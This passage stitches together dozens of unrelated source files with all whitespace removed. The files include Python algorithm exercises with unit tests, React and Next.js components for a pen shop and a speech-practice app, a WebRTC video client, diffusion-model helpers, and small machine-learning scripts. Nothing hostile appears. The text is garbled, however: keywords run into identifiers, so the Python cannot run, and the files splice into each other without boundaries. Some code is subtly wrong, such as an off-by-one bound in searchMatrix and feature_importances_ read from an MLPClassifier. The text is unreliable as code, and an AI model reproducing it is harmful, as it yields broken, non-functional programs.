ums)>0):if(nums.pop()innums):returnTruereturnFalsedefsortNums(self,nums:list[int])->bool:nums.sort()foriinrange(len(nums)-1):if(nums[i]==nums[i+1]):returnTruereturnFalsedefcontainsDuplicate(self,nums:list[int])->bool:visited=set()foriinnums:if(iinvisited):returnTruevisited.add(i)returnFalseclassTestSolution(unittest.TestCase):defsetUp(self):self.solution=Solution()deftest_containsDuplicate(self):self.assertTrue(self.solution.containsDuplicate([1,2,3,3]))self.assertFalse(self.solution.containsDuplicate([1,2,3,4]))self.assertTrue(self.solution.containsDuplicate([1,1,1,3,3,4,3,2,4,2]))unittest.main()importunittestfrommathimportceilclassSolution:defevaluate(self,piles:list[int],speed:int)->int:returnsum(ceil(pile/speed)forpileinpiles)defminEatingSpeed(self,piles:list[int],target:int)->int:slowest=1#bananasperhourfastest=max(piles)#bananasperhourwhile(slowest<=fastest):speed=(slowest+fastest)//2time=self.evaluate(piles,speed)if(time==target):while(time==target):if(speed!=1):speed-=1else:returnspeedtime=self.evaluate(piles,speed)returnspeed+1elif(time<target):fastest=speed-1else:#time>targetslowest=speed+1returnspeedclassTestSolution(unittest.TestCase):defsetUp(self):self.s=Solution()deftest1(self):self.assertEqual(self.s.minEatingSpeed([3,6,7,11],8),4)deftest2(self):self.assertEqual(self.s.minEatingSpeed([30,11,23,4,20],5),30)deftest3(self):self.assertEqual(self.s.minEatingSpeed([30,11,23,4,20],6),23)#unittest.main()print(Solution().minEatingSpeed([312884470],312884469))importmatplotlib.pyplotaspltimportnumpyasnp#Defineconstantsg=9.8#gravitationalaccelerationinm/s^2k=0.01#airresistanceconstantinkg/mm=1#massofprojectileinkg#Definefunctionsdefh_no_air(v0):#Maximumheightwithoutairresistancereturnv0**2/(2*g)defh_with_air(v0):#Maximumheightwithairresistancereturn(m/k)*np.log(1+(k*v0**2)/(m*g))#Createarraysforinitialvelocityandmaximumheightv0=np.linspace(0,100,100)#initialvelocityinm/sh1=h_no_air(v0)#maximumheightwithoutairresistanceinmh2=h_with_air(v0)#maximumheightwithairresistanceinm#Plotthegraphplt.plot(v0**2,2*h1,label="Noairresistance")plt.plot(v0**2,2*h2,label="Airresistance")plt.xlabel("$v_0^2$(m$^2$/s$^2$)")plt.ylabel("$2h$(m)")plt.title("Graphof$v_0^2$and$2h$withairresistanceproportionalto$v^2$")plt.legend()plt.show()'useclient';importBoardfrom'@/components/Board.js';importCommentsPanelfrom'@/components/CommentsPanel.js';exportdefaultfunctionHome(){constcomments=[{id:1,text:'Thisisacomment',poster:'Nathan',date:newDate('2022-03-25'),move:12,profile:'https://th.bing.com/th/id/R.3cd190548b0f15a338d44eb465dd0476?rik=Bn7r%2fBvgVHSihw&pid=ImgRaw&r=0'},{id:2,text:'Thisisanothercomment',poster:'Ritz',date:newDate('2023-04-26'),move:13,profile:'https://th.bing.com/th/id/OIP.OesLvyzDO6AvU_hYUAT4IAHaHa?pid=ImgDet&rs=1'},];return(<divid='container'><Boardcomments={comments}/><CommentsPanelcomments={comments}/></div>);}#8/20/23+8weeks=importdatetimestart=datetime.datetime(2023,8,20)end=start+datetime.timedelta(weeks=8)print(end.strftime("%m/%d/%y"))importstreamlitasstst.title("TheBard📖")st.markdown("###_Bringyourbookstolife_")st.write("")pdf_file=st.file_uploader("UploadBookPDF",type=['pdf'])if(pdf_file):st.write("Fileuploadedsuccessfully!")st.write("")st.write("#####Selectthechapteryouwanttovisualize")chapter=st.selectbox("Chapters",["Chapter1","Chapter2","Chapter3","Chapter4","Chapter5"])ifst.button("Visualize"):st.video('outputs/video.mp4')constmongoose=require('mongoose');constcommentSchema=newmongoose.Schema({user:{type:mongoose.Schema.Types.ObjectId,required:true,ref:'User',},game:{type:mongoose.Schema.Types.ObjectId,required:true,ref:'Game',},content:{type:String,required:true,},move:{type:Number,required:true,default:-1,},},{timestamps:true,});module.exports=mongoose.model('Comment',commentSchema);constMajorForm=({major,setMajor,nextStep})=>{return(<div><h2className='text-center'>Whatisyourmajor?</h2><inputtype='text'value={major}onChange={(e)=>setMajor(e.target.value)}className='borderp-2mt-4w-full'placeholder='Enteryourmajor'/><divclassName='flexmt-4'><buttonclassName='bg-gray-500text-whitepy-2w-fullrounded'onClick={nextStep}>Next</button></div></div>);};exportdefaultMajorForm;constlocalVideo=document.getElementById("local-video");constremotesDiv=document.getElementById("remotes");constparams=newURLSearchParams(window.location.search)constserverUrl="ws://localhost:7000/ws";/*eslint-envbrowser*/constjoinBtns=document.getElementById("start-btns");constconfig={iceServers:[{urls:"stun:stun.l.google.com:19302",},],};constsignalLocal=newSignal.IonSFUJSONRPCSignal(serverUrl);constclientLocal=newIonSDK.Client(signalLocal,config);signalLocal.onopen=()=>clientLocal.join(params.has("session")?params.get("session"):"ion");/***Foreveryremotestreamthisobjectwillholdthefollwinginformation:*{*"id-of-the-remote-stream":{*stream:[Object],//Referencetothestreamobject*videoElement:[Object]//Referencetothevideoelementthat'srenderingthestream.*}*}*/conststreams={};/***WhenweclicktheEnableAudiobuttonthisfunctiongetscalled,and*unmutesalltheremotevideosthatmightbethereandalsoanyfutureones.*Thislittlepartytrickisaccordingto*https://developer.mozilla.org/en-US/docs/Web/Media/Autoplay_guide.*/letremoteVideoIsMuted=true;functionenableAudio(){if(remoteVideoIsMuted){//UnmuteallthecurrentvideoElements.for(conststreamInfoofObject.values(streams)){let{videoElement}=streamInfo;videoElement.pause();videoElement.muted=false;videoElement.play();}//SetremoteVideoIsMutedtofalsesothatallfutureautoplays//work.remoteVideoIsMuted=false;constbutton=document.getElementById("enable-audio-button");button.remove();}}letlocalStream;conststart=()=>{IonSDK.LocalStream.getUserMedia({resolution:"vga",audio:true,codec:params.has("codec")?params.get("codec"):"vp8",}).then((media)=>{localStream=media;localVideo.srcObject=media;localVideo.autoplay=true;localVideo.controls=true;localVideo.muted=true;joinBtns.style.display="none";clientLocal.publish(media);}).catch(console.error);};clientLocal.ontrack=(track,stream)=>{console.log("gottrack",track.id,"forstream",stream.id);track.onunmute=()=>{//Ifthestreamisnotthereinthestreamsmap.if(!streams[stream.id]){//CreateavideoelementforrenderingthestreamconstremoteVideo=document.createElement("video");remoteVideo.srcObject=stream;remoteVideo.autoplay=true;remoteVideo.muted=remoteVideoIsMuted;remotesDiv.appendChild(remoteVideo);//Savethestreamandvideoelementinthemap.streams[stream.id]={stream,videoElement:remoteVideo};//Whenthisstreamremovesatrack,assume//thatitsgoingawayandremoveit.stream.onremovetrack=()=>{try{if(streams[stream.id]){const{videoElement}=streams[stream.id];remotesDiv.removeChild(videoElement);deletestreams[stream.id];}}catch(err){}};}};};constcontrolLocalVideo=(radio)=>{if(radio.value==="false"){localStream.mute("video");}else{localStream.unmute("video");}};constcontrolLocalAudio=(radio)=>{if(radio.value==="false"){localStream.mute("audio");}else{localStream.unmute("audio");}};importunittestclassSolution:defcarFleet(self,target:int,positions:list[int],speeds:list[int])->int:positions,speeds=zip(*sorted(zip(positions,speeds)))times=[(target-position)/speedforposition,speedinzip(positions,speeds)]fleets=1slowest=times.pop(-1)fortimeinreversed(times):if(time>slowest):fleets+=1slowest=timereturnfleetsclassTestCarFleet(unittest.TestCase):defsetUp(self):self.sol=Solution()deftest_car_fleet_1(self):target=12position=[10,8,0,5,3]speed=[2,4,1,1,3]self.assertEqual(self.sol.carFleet(target,position,speed),3)deftest_car_fleet_2(self):target=10position=[3]speed=[3]self.assertEqual(self.sol.carFleet(target,position,speed),1)deftest_car_fleet_3(self):target=100position=[0,2,4]speed=[4,2,1]self.assertEqual(self.sol.carFleet(target,position,speed),1)unittest.main()fromabcimportabstractmethodfromtypingimportDict,Union,Optional,List,CallableimportfunctoolsfromomegaconfimportListConfig,DictConfigfrom..datapipelineimportmake_callable,time_measureclassAbstractMapper(object):timeout=Nonedef__init__(self,exclude_keys:Optional[Union[List[str],ListConfig,str]]=None,timeout:Optional[float]=None,verbose:bool=False,):self.timeout=timeoutifnotexclude_keys:exclude_keys=[]self.verbose=verboseifisinstance(exclude_keys,str):exclude_keys=[exclude_keys]self.exclude_keys=exclude_keysdefskip_this_sample(self,sample:Dict)->bool:res=any(map(lambdax:xinsample["__url__"],self.exclude_keys))delsamplereturnres@abstractmethoddef__call__(self,sample:Dict)->Union[Dict,None]:raiseNotImplementedError("AbstractMappershouldnotbecalledbutoverwritten")classLambdaMapper(AbstractMapper):def__init__(self,keys:Union[str,List[str],ListConfig],fn:Union[Dict,DictConfig,Callable],*args,**kwargs):super().__init__(*args,**kwargs)ifisinstance(keys,str):keys=[keys]self.keys=keysifisinstance(fn,Union[Dict,DictConfig]):fn=make_callable(fn)self.fn=fn@time_measure("LambdaMapper")def__call__(self,sample:Dict)->Dict:ifself.skip_this_sample(sample):returnsampleforkeyinself.keys:sample[key]=self.fn(sample[key])returnsampleconstgetPoints=()=>{returndocument.getElementById('points-text-area').value.split('\n').map((point)=>{returnpoint.split('').map((coordinate)=>{returnparseFloat(coordinate);});});};constgetCircles=()=>{returndocument.getElementById('circles-text-area').value.split('\n').map((circle)=>{returncircle.split('').map((coordinate)=>{returnparseFloat(coordinate);});});}constgetPointsTrace=(points)=>{constx=[];consty=[];points.forEach((point)=>{x.push(point[0]);y.push(point[1]);});consttrace={x:x,y:y,mode:'markers',type:'scatter',hoverinfo:'skip',};returntrace;};constgetCirclesLayout=(circles)=>{constx=[];consty=[];constr=[];circles.forEach((circle)=>{x.push(circle[0]);y.push(circle[1]);r.push(circle[2]);});constblueFill='rgba(91,138,253,0.4)';constblueLine='rgba(25,97,251,0.6)';constlayout={//1:1aspectratio//autosize:false,//width:500,//height:500,shapes:[{type:'circle',xref:'x',yref:'y',x0:x[0]-r[0],y0:y[0]-r[0],x1:x[0]+r[0],y1:y[0]+r[0],line:{color:blueLine,width:1,},fillcolor:blueFill,},{type:'circle',xref:'x',yref:'y',x0:x[1]-r[1],y0:y[1]-r[1],x1:x[1]+r[1],y1:y[1]+r[1],line:{color:blueLine,width:1,},fillcolor:blueFill,},],};returnlayout;};frompineconeimportPineconefromsentence_transformersimportSentenceTransformerfromdotenvimportdotenv_valuesconfig=dotenv_values(".env")pc=Pinecone(api_key=config["PINECONE_API_KEY"])index=pc.Index("test")model=SentenceTransformer("all-MiniLM-L6-v2")defgetCourses(query:str,topK:int):try:#Tokenizethequeryvector=model.encode(query,normalize_embeddings=True,)#PerformthequeryonthePineconeindexresults=index.query(vector=vector.tolist(),top_k=topK,include_values=False)courses=[]formatchinresults["matches"]:identifiers=match["id"].split()course={"subject":"".join(identifiers[:-1]),"number":identifiers[-1],"score":match["score"],}courses.append(course)returncoursesexceptExceptionase:print(e)return[]constGraduationYearForm=({graduationYear,setGraduationYear,prevStep,handleSubmit})=>{return(<div><h2className='text-center'>Whatisyourgraduationyear?</h2><inputtype='text'value={graduationYear}onChange={(e)=>setGraduationYear(e.target.value)}className='borderp-2mt-4w-full'placeholder='Enteryourgraduationyear'/><divclassName='flexmt-4'><buttonclassName='bg-gray-500text-whitepy-2w-1/2roundedm-1hover:bg-gray-700transition-colorsduration-100ease-out'onClick={prevStep}>Back</button><buttonclassName='bg-green-500text-whitepy-2w-1/2roundedm-1hover:bg-green-600transition-colorsduration-100ease-out'onClick={handleSubmit}>Submit</button></div></div>);};exportdefaultGraduationYearForm;'useclient';import{useEffect}from'react';importSliderfrom'react-slick';import'slick-carousel/slick/slick.css';import'slick-carousel/slick/slick-theme.css';constLandingPage=()=>{useEffect(()=>{constsvgElement=document.getElementById('background-svg');if(svgElement){constelements=svgElement.querySelectorAll('polygon');//Functiontomakeeachhexagonmovesmoothlyandrandomlyelements.forEach((element)=>{constrandomMovement=()=>{constmoveX=Math.random()*4000-2000;//LargerscreensimulationconstmoveY=Math.random()*3000-1500;//Largerscreensimulationconstduration=20000+Math.random()*10000;//Durationbetween15-20secondstoslowdownthefastesthexagonselement.animate([{transform:element.style.transform},{transform:`translate(${moveX}px,${moveY}px)rotate(${element.dataset.rotation}deg)`,},],{duration:duration,//Slowermovementeasing:'ease-in-out',iterations:Infinity,});};randomMovement();});}//AddsmoothscrollingbehaviorconstsmoothScroll=(e)=>{e.preventDefault();consttargetId=e.currentTarget.getAttribute('href');consttargetElement=document.querySelector(targetId);if(targetElement){targetElement.scrollIntoView({behavior:'smooth'});}};constlearnMoreButton=document.querySelector('#learn-more-button');if(learnMoreButton){learnMoreButton.addEventListener('click',smoothScroll);}//Cleanupeventlistenerreturn()=>{if(learnMoreButton){learnMoreButton.removeEventListener('click',smoothScroll);}};},[]);constcarouselSettings={dots:true,infinite:true,speed:500,slidesToShow:1,slidesToScroll:1,autoplay:true,autoplaySpeed:5000,};return(<divclassName='flexflex-coljustify-betweenmin-h-screentext-centerbg-tan-100text-gray-800overflow-hidden'><headerclassName='flexjustify-betweenitems-centerpx-8py-6'><divclassName='text-3xlfont-extraboldtext-gray-900font-sans'>Impromptu🗣️🗣️🗣️</div>{/*<navclassName="flexgap-8"><ahref="#features"className="text-lgfont-mediumhover:text-gray-600transition-colorsduration-300font-sans">Features</a><ahref="#about"className="text-lgfont-mediumhover:text-gray-600transition-colorsduration-300font-sans">About</a><ahref="#contact"className="text-lgfont-mediumhover:text-gray-600transition-colorsduration-300font-sans">Contact</a></nav>*/}</header><sectionclassName='flexflex-colitems-centerjustify-centerflex-growrelativepy-24min-h-[70vh]'><divclassName='absoluteinset-0opacity-20'><svgid='background-svg'className='w-fullh-fulltransition-transformduration-200ease-out'xmlns='http://www.w3.org/2000/svg'fill='none'stroke='gray'strokeWidth='2'><g>{[...Array(50)].map((_,i)=>{constsize=100+Math.random()*600;constrotation=Math.random()*360;return(<polygonkey={i}points={`${size/2},0${size},${size/4}${size},${(size/4)*3}${size/2},${size}0,${(size/4)*3}0,${size/4}`}fill='none'data-rotation={rotation}style={{transform:`translate(${Math.random()*4000-2000}px,${Math.random()*3000-1500}px)rotate(${rotation}deg)`,opacity:0.6,}}/>);})}</g></svg></div><h1className='text-7xlfont-boldmb-12leading-tightz-10text-gray-900font-sans'>SpeakBoldly</h1><pclassName='text-2xlfont-lightmb-16max-w-2xlz-10font-sans'>Transformyourimpromptuspeakingskillswithreal-timeinsightsandthoughtfulprompts.</p><divclassName='flexspace-x-6'><buttonclassName='bg-sky-500hover:bg-sky-400text-whitefont-boldpy-3px-10rounded-lgshadow-lgtransition-transformtransformhover:scale-105z-10text-lg'onClick={()=>(window.location.href='/')}>GetStartedNow</button><buttonid='learn-more-button'href='#features'className='bg-whitehover:bg-sky-50text-sky-500font-boldpy-3px-10rounded-lgshadow-lgtransition-transformtransformhover:scale-105z-10border-2border-sky-500text-lg'>LearnMore</button></div></section><sectionid='features'className='bg-gray-100py-24px-8'><h2className='text-4xlfont-boldmb-12text-gray-900font-sans'>OurFeatures</h2><Slider{...carouselSettings}className='max-w-4xlmx-auto'><divclassName='px-4'><imgsrc='/gemini-suggestions.gif'alt='Gemini-PoweredSuggestions'className='w-3/4h-[450px]object-coverrounded-lgmb-4mx-auto'/><h3className='text-2xlfont-semiboldmb-2text-gray-800'>Gemini-PoweredSuggestions</h3><pclassName='text-gray-600'>ReceiveintelligentsuggestionsandinsightsfromourGeminiAI,basedonyourspeechnotes,toenhanceyourimpromptuspeakingperformanceandcontentdelivery.</p></div><divclassName='px-4'><imgsrc='/topic-generator.gif'alt='DynamicTopicGenerator'className='w-3/4h-[450px]object-coverrounded-lgmb-4mx-auto'/><h3className='text-2xlfont-semiboldmb-2text-gray-800'>DynamicTopicGenerator</h3><pclassName='text-gray-600'>Challengeyourselfwithourintelligenttopicgenerator,designedtoprovidethought-provokingsubjectstailoredtoyourskilllevelandinterests.</p></div><divclassName='px-4'><imgsrc='/temp.png'alt='Real-timeJudgeFeedback'className='w-3/4h-[450px]object-coverrounded-lgmb-4mx-auto'/><h3className='text-2xlfont-semiboldmb-2text-gray-800'>Real-timeJudgeFeedback</h3><pclassName='text-gray-600'>EngageindynamicconversationswithAIjudgeswhoprovideimmediate,constructivefeedbackonyourimpromptuspeeches,simulatingreal-worldspeakingscenarios.</p></div></Slider></section></div>);};exportdefaultLandingPage;import{useState,useEffect}from'react';importdatafrom'../data/data.json';importQuestionfrom'@/components/Question/Question';importNavigationfrom'@/components/Navbar';importQuestionHistoryfrom'./QuestionHistory';import{onAuthStateChanged}from'firebase/auth';import{auth}from'@/firebase/firebase';constPage=({data_cluster,cluster})=>{const[questions]=useState(newSet(data[data_cluster]));const[question,setQuestion]=useState(data[data_cluster][0]);const[userId,setUserId]=useState();const[completedQuestions,setCompletedQuestions]=useState([]);const[missedQuestions,setMissedQuestions]=useState([]);useEffect(()=>{onAuthStateChanged(auth,(user)=>{if(user){setUserId(user.uid);}else{console.log('Nousersignedin');}});},[]);useEffect(()=>{conststartI=Math.floor(Math.random()*questions.size);setQuestion(data[data_cluster][startI]);},[questions.size]);constgetNextQuestion=()=>{constgetRandomItem=(set)=>{constitems=Array.from(set);returnitems[Math.floor(Math.random()*items.length)];};constdifference=(a,b)=>{returnnewSet([...a].filter((x)=>!b.has(x)));};constunion=(a,b)=>{returnnewSet([...a,...b]);};constrandomId=getRandomItem(union(difference(Array.from(questions).map((question)=>{returnquestion.id;}),newSet(completedQuestions)),newSet(missedQuestions)));constquestion=Array.from(questions).find((question)=>{returnquestion.id===randomId;});returnquestion;};return(<divclassName='flexflex-row-reverseh-screen'>{userId&&(<QuestionHistoryuserId={userId}category={cluster}questions={questions}setQuestion={setQuestion}/>)}<divclassName='flex-1'><Navigation/><divid='container'className='mx-automd:w-fulllg:w-1/2'>{userId&&(<Questionquestion={question}setQuestion={setQuestion}getNextQuestion={getNextQuestion}category={cluster}userId={userId}/>)}</div></div></div>);};exportdefaultPage;importunittestclassSolution:defflatten(self,matrix:list[list[int]],target:int)->bool:returntargetin[nforrowinmatrixforninrow]@staticmethoddefsearchRow(matrix:list[list[int]],target:int)->int:lower=0upper=len(matrix)-1while(lower<=upper):guess=(lower+upper)//2left=matrix[guess][0]right=matrix[guess][-1]if(left<=target<=right):returnguesselif(target<left):upper=guess-1else:#target>rightlower=guess+1returnNonedefsearchMatrix(self,matrix:list[list[int]],target:int)->bool:try:row:list[int]=matrix[Solution.searchRow(matrix,target)]exceptTypeError:returnFalselower=0upper=len(row)while(lower<=upper):guess=(lower+upper)//2value=row[guess]if(value==target):returnTrueelif(value<target):lower=guess+1else:#value>targetupper=guess-1returnFalseclassTestSolution(unittest.TestCase):defsetUp(self):self.s=Solution()deftest1(self):matrix=[[1,3,5,7],[10,11,16,20],[23,30,34,60]]target=3self.assertEqual(self.s.searchMatrix(matrix,target),True)deftest2(self):matrix=[[1,3,5,7],[10,11,16,20],[23,30,34,60]]target=13self.assertEqual(self.s.searchMatrix(matrix,target),False)#unittest.main()print(Solution().searchMatrix([[1]],1))importProductCardfrom'@/components/ProductCard';importNavbarfrom'@/components/Navbar';importImagefrom'next/image';importLinkfrom'next/link';importHeadfrom'next/head';importFooterfrom'@/components/Footer';import{products}from'@/data/products';constShop=()=>{return(<divclassName='bg-slate-100h-screenoverflow-autooverflow-x-hidden'><Head><title>Shop</title><linkrel='icon'href='/favicon.png'/></Head><Navbar/><divclassName='relativeh-[20em]w-fulloverflow-hiddenmb-2'><ImageclassName='blur-smscale-[1.05]brightness-[0.6]h-fullobject-cover'src='/wide.jpg'width={25600}height={14400}alt='banner'/><divclassName='absoluteinset-0flexflex-coljustify-centeritems-center'><h1className='w-[40rem]text-centertext-whitetext-5xlfont-boldp-5'>ShopPens,Highlighters,andDryEraseMarkers</h1><pclassName='text-white'>Unfortunately,asofnow,weonlyacceptbulkordersfrominstitutions.</p><pclassName='text-white'>Pleaseallow~15businessdaysforyourordertobeprocessedandshipped.</p><divclassName='flexjustify-centeritems-centerm-5'><Linkhref='/order'className='rounded-mdbg-gradient-to-rfrom-sky-500to-sky-400hover:from-sky-400hover:to-sky-300px-3.5py-2.5text-smfont-semiboldtext-whiteshadow-smhover:bg-indigo-500focus-visible:outlinefocus-visible:outline-2focus-visible:outline-offset-2focus-visible:outline-indigo-600'>OrderNow</Link></div></div></div><divclassName='flexjustify-center'><divclassName='gridlg:grid-cols-4md:grid-cols-3sm:grid-cols-1gap-4w-3/5'>{products.map((item,index)=>(<ProductCardkey={index}name={item['name']}src={item['images'][0]}/>))}</div></div><Footer/></div>);};exportdefaultShop;importtorchfromsgm.modules.diffusionmodules.discretizerimportDiscretizationclassImg2ImgDiscretizationWrapper:"""wrapsadiscretizer,andprunesthesigmasparams:strength:floatbetween0.0and1.0.1.0meansfullsampling(allsigmasarereturned)"""def__init__(self,discretization:Discretization,strength:float=1.0):self.discretization=discretizationself.strength=strengthassert0.0<=self.strength<=1.0def__call__(self,*args,**kwargs):#sigmasstartlargefirst,anddecreasethensigmas=self.discretization(*args,**kwargs)print(f"sigmasafterdiscretization,beforepruningimg2img:",sigmas)sigmas=torch.flip(sigmas,(0,))sigmas=sigmas[:max(int(self.strength*len(sigmas)),1)]print("pruneindex:",max(int(self.strength*len(sigmas)),1))sigmas=torch.flip(sigmas,(0,))print(f"sigmasafterpruning:",sigmas)returnsigmasclassTxt2NoisyDiscretizationWrapper:"""wrapsadiscretizer,andprunesthesigmasparams:strength:floatbetween0.0and1.0.0.0meansfullsampling(allsigmasarereturned)"""def__init__(self,discretization:Discretization,strength:float=0.0,original_steps=None):self.discretization=discretizationself.strength=strengthself.original_steps=original_stepsassert0.0<=self.strength<=1.0def__call__(self,*args,**kwargs):#sigmasstartlargefirst,anddecreasethensigmas=self.discretization(*args,**kwargs)print(f"sigmasafterdiscretization,beforepruningimg2img:",sigmas)sigmas=torch.flip(sigmas,(0,))ifself.original_stepsisNone:steps=len(sigmas)else:steps=self.original_steps+1prune_index=max(min(int(self.strength*steps)-1,steps-1),0)sigmas=sigmas[prune_index:]print("pruneindex:",prune_index)sigmas=torch.flip(sigmas,(0,))print(f"sigmasafterpruning:",sigmas)returnsigmasimportpytorch_lightningasplimporttorchvisionfromtorch.utils.dataimportDataLoader,DatasetfromtorchvisionimporttransformsclassCIFAR10DataDictWrapper(Dataset):def__init__(self,dset):super().__init__()self.dset=dsetdef__getitem__(self,i):x,y=self.dset[i]return{"jpg":x,"cls":y}def__len__(self):returnlen(self.dset)classCIFAR10Loader(pl.LightningDataModule):def__init__(self,batch_size,num_workers=0,shuffle=True):super().__init__()transform=transforms.Compose([transforms.ToTensor(),transforms.Lambda(lambdax:x*2.0-1.0)])self.batch_size=batch_sizeself.num_workers=num_workersself.shuffle=shuffleself.train_dataset=CIFAR10DataDictWrapper(torchvision.datasets.CIFAR10(root=".data/",train=True,download=True,transform=transform))self.test_dataset=CIFAR10DataDictWrapper(torchvision.datasets.CIFAR10(root=".data/",train=False,download=True,transform=transform))defprepare_data(self):passdeftrain_dataloader(self):returnDataLoader(self.train_dataset,batch_size=self.batch_size,shuffle=self.shuffle,num_workers=self.num_workers,)deftest_dataloader(self):returnDataLoader(self.test_dataset,batch_size=self.batch_size,shuffle=self.shuffle,num_workers=self.num_workers,)defval_dataloader(self):returnDataLoader(self.test_dataset,batch_size=self.batch_size,shuffle=self.shuffle,num_workers=self.num_workers,)#%%importpandasaspdfromxgboostimportXGBClassifier,XGBRegressorfromsklearn.ensembleimportRandomForestClassifier,RandomForestRegressorfromsklearn.svmimportSVC,SVRimportjsonfromsklearn.preprocessingimportMinMaxScalerfromsklearn.model_selectionimporttrain_test_splitfromsklearn.metricsimportaccuracy_score,classification_report#%%Loadandpreprocessdatadf=pd.DataFrame(json.load(open('spy.json'))['1d']).drop('time',axis=1)#%%#addacolumnthatisthepercentchange5daysinthefuturedf['future']=df['close'].shift(-5)df['percent_change']=(df['future']-df['close'])/df['close']df['direction']=df['percent_change']>0forshiftinrange(1,25+1):df[f'day-{shift}']=df['close'].shift(shift)df.dropna(inplace=True)#%%X=df.drop(['open','high','low','close','volume','future','percent_change','direction'],axis=1)y=df['direction']X_train,X_test,y_train,y_test=train_test_split(X,y,test_size=0.2,shuffle=False)#%%scaler=MinMaxScaler()X_train=scaler.fit_transform(X_train)#%%#randomlyundersamplethemajorityclassfromimblearn.under_samplingimportRandomUnderSamplerrus=RandomUnderSampler()X_train,y_train=rus.fit_resample(X_train,y_train)model=RandomForestClassifier()model.fit(X_train,y_train)#%%X_test=scaler.transform(X_test)y_pred=model.predict(X_test)#%%print(accuracy_score(y_test,y_pred))#%%importNavbarfrom'@/components/Navbar';importImagefrom'next/image';constConfirm=()=>{return(<divclassName='flexflex-coljustify-centerh-screenbg-gray-100'><Navbar/><divclassName='flexflex-colitems-centerjustify-centerh-fullmt-10text-gray-800'><h1className='text-3xlfont-boldmb-6'>ThankYouforYourOrder!</h1><pclassName='mb-2text-center'>Weappreciateyourbusinessandwe&apos;reexcitedtohaveyouasacustomer.Pleasecheckyouremailforaconfirmationmessagewiththedetailsofyourorder.</p><pclassName='mb-2text-center'>Amemberofourteamwillbesendingyouafollow-upemailshortlytofacilitatethecompletionofyourpurchase.Wewanttoensurethatyourexperienceisassmoothaspossible.</p><pclassName='mb-2text-center'>Ifyouhaveanyquestionsorneedfurtherassistance,pleasedon&apos;thesitatetoreachouttous.</p><pclassName='text-centermb-4'>Thankyouagainforchoosingus!</p><hrclassName='w-52h-pxmx-automy-4bg-gray-100border-0roundedmd:my-10bg-gray-500'/><pclassName='text-centerfont-semibold'>NathanandCharlesfromEnduraScribe</p><divclassName='p-4flexitems-center'><Imagesrc={'/black_double_connected.png'}width={100}height={0}alt='nathansignature'/><Imagesrc={'/charles.png'}width={300}height={0}alt='charlessignature'/></div></div></div>);};exportdefaultConfirm;constLogin=()=>{return<div>Login</div>;};exportdefaultLogin;importunittestfromcollectionsimportCounterclassSolution:defbuiltIn(self,a:str,b:str)->bool:returnCounter(a)==Counter(b)returnsorted(a)==sorted(b)defisAnagram(self,a:str,b:str)->bool:if(len(a)!=len(b)):returnFalseacount={}forcharina:acount[char]=acount.get(char,0)+1bcount={}forcharinb:bcount[char]=bcount.get(char,0)+1forchar,countinacount.items():if(count!=bcount.get(char,-1)):returnFalsereturnTrueclassTestSolution(unittest.TestCase):defsetUp(self):self.solution=Solution()deftest_isAnagram(self):self.assertTrue(self.solution.isAnagram('anagram','nagaram'))self.assertFalse(self.solution.isAnagram('rat','car'))unittest.main()importunittestfromcollectionsimportdequeclassSolution:defdailyTemperatures(self,temperatures:list[int])->list[int]:answer=[0]*len(temperatures)stack=deque()fori,temperatureinenumerate(temperatures):while(stackandtemperature>stack[-1][1]):top=stack.pop()answer[top[0]]=i-top[0]stack.append((i,temperature))returnanswerclassTestSolution(unittest.TestCase):deftest_dailyTemperatures(self):solution=Solution()self.assertListEqual(solution.dailyTemperatures([73,74,75,71,69,72,76,73]),[1,1,4,2,1,1,0,0])self.assertListEqual(solution.dailyTemperatures([30,40,50,60]),[1,1,1,0])self.assertListEqual(solution.dailyTemperatures([30,60,90]),[1,1,0])unittest.main()importosfromPILimportImage#Definethedirectoriesandthebackgroundimageimages_dir='Images'backgrounds_dir='Backgrounds'background_image_path='red_scaled.jpg'#Openthebackgroundimagebackground_image=Image.open(background_image_path)#Loopthroughallfilesintheimagesdirectoryforfilenameinos.listdir(images_dir):#Checkifthefileisa.pngimageiffilename.endswith('.png'):#Opentheimageimg=Image.open(os.path.join(images_dir,filename))#Resizethebackgroundimagetomatchthecurrentimage'ssizeresized_background=background_image.resize(img.size)#Createanewimagewiththebackgroundandthecurrentimageresult=Image.alpha_composite(resized_background.convert('RGBA'),img.convert('RGBA'))#Savetheresultingimageinthebackgroundsdirectoryresult.save(os.path.join(backgrounds_dir,filename.split('.')[0]+'_with_background.png'))print('Imagesprocessedsuccessfully.')#Imageryscoreimportpandasaspdimportswifterfromstatisticsimportmeanfromconcurrent.futuresimportThreadPoolExecutordf=pd.read_feather('essaygrader/data/essays.feather')emote=pd.read_excel('essaygrader/data/emote.xlsx')#defscore(essay):defscore(essays):"""Scoresanessaybasedontheemotion."""iessay=0scores=[]defevaluate(essay):points=0forwordinessay.split():word=word.lower()ifword.lower()inemote['word'].unique():bnoun=emote[emote['word']==word]['noun'].values[0]if(bnoun):points+=mean(emote[emote['word']==word][['ndim'+str(i)foriinrange(1,8)]].values[0])else:points+=mean(emote[emote['word']==word][['adim'+str(i)foriinrange(1,11)]].values[0])returnpointswithThreadPoolExecutor(max_workers=64)asexecutor:foressayinessays:scores.append(executor.submit(evaluate,essay).result())iessay+=1print(iessay)returnscoresdf['score']=score(df['essay'])df.to_feather('imagery.feather')#%%importpandasaspdimportmatplotlib.pyplotaspltfromsklearn.metricsimportclassification_reportfromsklearn.model_selectionimporttrain_test_splitfromsklearn.pipelineimportPipelinefromsklearn.preprocessingimportStandardScalerfromsklearn.neural_networkimportMLPClassifierfromxgboostimportXGBClassifier#%%girls=pd.read_excel('girls.xlsx')guys=pd.read_excel('guys.xlsx')neutral=pd.read_excel('neutral.xlsx')#%%neutral['label']=0girls['label']=1guys['label']=2#%%df=pd.concat([neutral,girls,guys])df#%%preprocessor=Pipeline([('scaler',StandardScaler()),])#%%independents=df.columns[:-1]dependent='label'#%%processed_df=pd.DataFrame(preprocessor.fit_transform(df[independents]),columns=independents)processed_df#%%X=processed_dfy=df[dependent]X_train,X_test,y_train,y_test=train_test_split(X,y,test_size=0.2,random_state=42)#%%#model=XGBClassifier()model=MLPClassifier(hidden_layer_sizes=(100,100,100),max_iter=1000,random_state=42)model.fit(X_train,y_train)#%%y_pred=model.predict(X_test)print(classification_report(y_test,y_pred))#%%#featureimportanceplt.barh(independents,model.feature_importances_)#exporttofileplt.savefig('feature_importance.png')constClasses=({classes})=>{return(<divclassName='mb-6'><h3className='text-lgfont-semiboldmb-2'>Classes</h3><divclassName='flexflex-wrapgap-2'>{classes.map((interest,i)=>(<spankey={i}className='bg-gray-200text-gray-800px-3py